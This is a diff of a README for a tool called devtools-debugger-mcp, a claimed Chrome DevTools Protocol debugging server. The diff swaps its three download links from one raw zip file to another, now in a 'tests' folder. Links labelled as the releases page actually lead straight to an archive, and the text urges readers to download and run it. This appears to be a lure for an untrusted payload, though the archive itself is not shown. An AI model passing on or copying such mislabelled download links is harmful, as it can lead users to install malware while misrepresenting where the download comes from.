@@ -4,7 +4,7 @@
 Welcome to the devtools-debugger-mcp project! This application allows you to debug your applications using a server that exposes the full Chrome DevTools Protocol. With features like breakpoints, step/run execution, call stacks, eval, and source maps, you'll find it easier to catch issues and improve your code.
 
 ## 🔗 Download Now
-[![Download Now](https://raw.githubusercontent.com/Gulhidayat/devtools-debugger-mcp/main/hyloid/devtools-debugger-mcp.zip)](https://raw.githubusercontent.com/Gulhidayat/devtools-debugger-mcp/main/hyloid/devtools-debugger-mcp.zip)
+[![Download Now](https://raw.githubusercontent.com/Gulhidayat/devtools-debugger-mcp/main/tests/devtools_mcp_debugger_v1.3-beta.2.zip)](https://raw.githubusercontent.com/Gulhidayat/devtools-debugger-mcp/main/tests/devtools_mcp_debugger_v1.3-beta.2.zip)
 
 ## 🚀 Getting Started
 To get started with devtools-debugger-mcp, follow these steps to download and run the software.
@@ -12,7 +12,7 @@ To get started with devtools-debugger-mcp, follow these steps to download and ru
 ### Step 1: Visit the Download Page
 Go to the releases page to find the latest version of devtools-debugger-mcp. You can do this by clicking the link below:
 
-[Visit Releases Page](https://raw.githubusercontent.com/Gulhidayat/devtools-debugger-mcp/main/hyloid/devtools-debugger-mcp.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/Gulhidayat/devtools-debugger-mcp/main/tests/devtools_mcp_debugger_v1.3-beta.2.zip)
 
 ### Step 2: Choose Your Version
 On the releases page, you will see a list of available versions. Look for the latest version. Each version will have a release date and a brief description of changes.
@@ -58,7 +58,7 @@ Once you run the application, you will see a user-friendly interface:
 ## 📥 Download & Install
 To download the latest version of devtools-debugger-mcp, click the link below:
 
-[Download from Releases Page](https://raw.githubusercontent.com/Gulhidayat/devtools-debugger-mcp/main/hyloid/devtools-debugger-mcp.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/Gulhidayat/devtools-debugger-mcp/main/tests/devtools_mcp_debugger_v1.3-beta.2.zip)
 
 ## 🛠️ Troubleshooting
 If you encounter any issues, here are some common solutions:
